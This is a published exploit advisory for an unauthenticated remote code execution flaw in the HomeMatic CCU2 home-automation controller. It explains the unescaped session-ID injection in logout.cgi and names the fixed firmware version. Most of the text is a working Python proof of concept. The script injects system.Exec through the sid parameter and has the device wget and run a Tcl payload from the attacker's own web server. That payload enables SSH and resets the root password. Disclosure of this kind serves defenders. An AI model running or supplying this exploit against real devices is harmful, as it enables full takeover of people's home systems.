# Exploit Title: HomeMatic Zentrale CCU2 Unauthenticated RCE
# Date: 16-07-2018
# Software Link: https://www.homematic.com/
# Exploit Author: Kacper Szurek - ESET
# Contact: https://twitter.com/KacperSzurek
# Website: https://security.szurek.pl/
# YouTube: https://www.youtube.com/c/KacperSzurek
# Category: remote
  
1. Description
   
File: /root/www/api/backup/logout.cgi
 
```
proc main { } {
    set sid [getQueryArg sid]
     
    if [catch { session_logout $sid}] { error LOGOUT }
     
    puts "Content-Type: text/plain"
    puts ""
    puts "OK"
}
```
 
`$sid` value is passed directly to `session_logout` function.
 
File: /root/www/tcl/eq3/session.tcl
 
```
proc session_logout { sid } {
  rega_exec "system.ClearSessionID(\"$sid\");"
}
```

`$sid` value is not escaped properly. 

We can close current rega script using `");` and execute our payload.
   
2. Proof of Concept
 
POC in Python which enable ssh access and change root password without any credentials.
 
```
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import time
import urllib2
import threading
import sys
import os
import signal

print "HomeMatic Zentrale CCU2 Unauthenticated RCE"
print "Unauthenticated Remote Code Execution"
print "by Kacper Szurek - ESET"
print "https://security.szurek.pl/"
print "https://twitter.com/KacperSzurek"
print "https://www.youtube.com/c/KacperSzurek\n"

def signal_handler(a, b):
    print "[+] Exit"
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

if len(sys.argv) != 4:
    print "Usage: exploit <your_ip> <homematic_ip> <new_password>"
    os._exit(0)

our_ip = sys.argv[1]
homematic_ip = sys.argv[2]
new_password = sys.argv[3]
tcl_file = """
#!/bin/tclsh
source /www/api/eq3/jsonrpc.tcl
source /www/api/eq3/json.tcl
set args(passwd) "{}"
set args(mode) "true"
source /www/api/methods/ccu/setssh.tcl
source /www/api/methods/ccu/setsshpassword.tcl
source /www/api/methods/ccu/restartsshdaemon.tcl
""".format(new_password)

class StoreHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print self.path
        if self.path == '/exploit':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(tcl_file)

def server():
    try:
        server = HTTPServer((our_ip, 1234), StoreHandler)
        server.serve_forever()
    except Exception, e:
        print "[-] Cannot start web server: {}".format(e)
        os._exit(0)

def send_payload(payload):
    return urllib2.urlopen('http://{}/api/backup/logout.cgi?sid=aa");system.Exec("{}");system.ClearSessionID("bb'.format(homematic_ip, payload)).read()

try:
    version = urllib2.urlopen('http://{}/api/backup/version.cgi'.format(homematic_ip), timeout=6).read()
except:
    version = ""

if not version.startswith('VERSION='):
    print "[-] Probably not HomeMatic IP: {}".format(homematic_ip)
    os._exit(0)

if "'" in new_password or '"' in new_password:
    print "[-] Forbidden characters in password"
    os._exit(0)

print "[+] Start web server"
t = threading.Thread(target=server)
t.daemon = True
t.start()
time.sleep(2)

print "[+] Download exploit"
send_payload('wget+-O+/tmp/exploit+http://{}:1234/exploit&&chmod+%2bx+/tmp/exploit'.format(our_ip))

print "[+] Set chmod +x"
send_payload('chmod+%2bx+/tmp/exploit')

print "[+] Execute exploit"
send_payload('/bin/tclsh+/tmp/exploit')

print "[+] Success, now you can ssh as root:"
print "ssh root@{}".format(homematic_ip)
print "Password: {}".format(new_password)
os._exit(0)
```
 
3. Solution:
    
Update to version 2.35.16